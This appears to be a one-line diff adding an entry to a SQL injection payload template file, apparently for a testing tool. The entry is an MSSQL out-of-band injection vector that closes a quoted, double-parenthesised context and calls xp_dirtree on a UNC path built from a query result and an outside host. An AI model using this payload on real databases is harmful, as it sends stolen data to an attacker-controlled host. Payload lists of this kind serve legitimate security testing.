@@ -1,0 +1,1 @@
+{"dbms": "mssql", "technique": "oob", "boundary": {"prefix": "')) ", "suffix": "-- -", "type": "paren2-single-ws"}, "vector": "{B} ; EXEC('master..xp_dirtree \"\\\\'+({Q})+'.{OOB}\"')", "comment": "mssql oob: single in 2 parens ws"}
